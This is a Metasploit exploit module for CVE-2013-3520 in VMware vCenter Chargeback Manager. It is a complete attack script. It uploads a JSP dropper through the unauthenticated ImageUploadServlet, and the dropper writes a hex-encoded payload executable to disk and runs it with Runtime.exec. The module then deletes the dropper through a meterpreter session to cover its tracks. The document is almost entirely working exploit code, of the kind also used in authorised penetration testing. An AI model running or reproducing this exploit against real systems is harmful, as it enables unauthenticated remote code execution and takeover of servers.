# frozen_string_literal: true
##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  HttpFingerprint = { pattern: [ /Apache.*Win32/ ] }.freeze

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
                      'Name'        => 'VMware vCenter Chargeback Manager ImageUploadServlet Arbitrary File Upload',
                      'Description' => %q(
                        This module exploits a code execution flaw in VMware vCenter Chargeback Manager,
                        where the ImageUploadServlet servlet allows unauthenticated file upload. The files
                        are uploaded to the /cbmui/images/ web path, where JSP code execution is allowed.
                        The module has been tested successfully on VMware vCenter Chargeback Manager 2.0.1
                        on Windows 2003 SP2.
                      ),
                      'Author' =>
                        [
                          'Andrea Micalizzi', # Vulnerability discovery
                          'juan vazquez' # Metasploit module
                        ],
                      'License'     => MSF_LICENSE,
                      'References'  =>
                        [
                          [ 'CVE', '2013-3520' ],
                          [ 'OSVDB', '94188' ],
                          [ 'BID', '60484' ],
                          [ 'ZDI', '13-147' ]
                        ],
                      'Privileged'  => true,
                      'Platform'    => 'win',
                      'Arch' => ARCH_X86,
                      'Targets' =>
                        [
                          [ 'VMware vCenter Chargeback Manager 2.0.1 / Windows 2003 SP2', {} ]
                        ],
                      'DefaultOptions' =>
                        {
                          'SSL' => true
                        },
                      'DefaultTarget'  => 0,
                      'DisclosureDate' => 'May 15 2013'))

    register_options(
      [
        Opt::RPORT(443)
      ], self.class
    )
  end

  #
  # Try to find and delete the jsp if we get a meterpreter.
  #
  def on_new_session(cli)
    return if !@dropper || @dropper.empty?

    if cli.type != 'meterpreter'
      print_error("Meterpreter not used. Please manually remove #{@dropper}")
      return
    end

    cli.core.use("stdapi") unless cli.ext.aliases.include?("stdapi")

    begin
      print_status("Searching: #{@dropper}")
      files = cli.fs.file.search("\\", @dropper)
      if !files || files.empty?
        print_error("Unable to find #{@dropper}. Please manually remove it.")
        return
      end

      files.each do |f|
        print_warning("Deleting: #{f['path'] + '\\' + f['name']}")
        cli.fs.file.rm(f['path'] + "\\" + f['name'])
      end
      print_good("#{@dropper} deleted")
      return
    rescue ::Exception => e
      print_error("Unable to delete #{@dropper}: #{e.message}")
    end
  end

  def upload_file(filename, contents)
    post_data = Rex::MIME::Message.new
    post_data.add_part(contents, "image/png", nil, "form-data; name=\"#{rand_text_alpha(4 + rand(4))}\"; filename=\"#{filename}\"")

    data = post_data.to_s

    res = send_request_cgi(
      'uri' => normalize_uri("cbmui", "ImageUploadServlet"),
      'method'  => 'POST',
      'data'    => data,
      'ctype'   => "multipart/form-data; boundary=#{post_data.bound}",
      'cookie'  => "JSESSIONID=#{@session}"
    )

    if res && (res.code == 200)
      return true
    else
      return false
    end
  end

  def check
    res = send_request_cgi('uri' => normalize_uri("cbmui", "en_US", "themes", "excel", "index.htm"))

    if res && (res.code == 200) && res.body =~ /vCenter Chargeback Manager/
      return Exploit::CheckCode::Detected
    end

    Exploit::CheckCode::Safe
  end

  def exploit
    print_status("Uploading JSP to execute the payload")

    exe = payload.encoded_exe
    exe_filename = rand_text_alpha(8) + ".exe"

    # The JSP dropper is needed because there isn't directory traversal, just
    # arbitrary file upload to a web path where JSP code execution is allowed.
    dropper = jsp_drop_and_execute(exe, exe_filename)
    dropper_filename = rand_text_alpha(8) + ".jsp"

    if upload_file(dropper_filename, dropper)
      register_files_for_cleanup(exe_filename)
      @dropper = dropper_filename
    else
      fail_with(Failure::Unknown, "#{peer} - JSP upload failed")
    end

    print_status("Executing payload")
    send_request_cgi(
      'uri' => normalize_uri("cbmui", "images", dropper_filename),
      'method' => 'GET'
    )
  end

  # This should probably go in a mixin
  def jsp_drop_bin(bin_data, output_file)
    jspraw =  %(<%@ page import="java.io.*" %>\n)
    jspraw << %(<%\n)
    jspraw << %(String data = "#{Rex::Text.to_hex(bin_data, '')}";\n)

    jspraw << %|FileOutputStream outputstream = new FileOutputStream("#{output_file}");\n|

    jspraw << %|int numbytes = data.length();\n|

    jspraw << %(byte[] bytes = new byte[numbytes/2];\n)
    jspraw << %|for (int counter = 0; counter < numbytes; counter += 2)\n|
    jspraw << %({\n)
    jspraw << %|  char char1 = (char) data.charAt(counter);\n|
    jspraw << %|  char char2 = (char) data.charAt(counter + 1);\n|
    jspraw << %|  int comb = Character.digit(char1, 16) & 0xff;\n|
    jspraw << %(  comb <<= 4;\n)
    jspraw << %|  comb += Character.digit(char2, 16) & 0xff;\n|
    jspraw << %|  bytes[counter/2] = (byte)comb;\n|
    jspraw << %(}\n)

    jspraw << %|outputstream.write(bytes);\n|
    jspraw << %|outputstream.close();\n|
    jspraw << %(%>\n)

    jspraw
  end

  def jsp_execute_command(command)
    jspraw =  %(<%@ page import="java.io.*" %>\n)
    jspraw << %(<%\n)
    jspraw << %(try {\n)
    jspraw << %|  Runtime.getRuntime().exec("chmod +x #{command}");\n|
    jspraw << %|} catch (IOException ioe) { }\n|
    jspraw << %|Runtime.getRuntime().exec("#{command}");\n|
    jspraw << %(%>\n)

    jspraw
  end

  def jsp_drop_and_execute(bin_data, output_file)
    jsp_drop_bin(bin_data, output_file) + jsp_execute_command(output_file)
  end
end
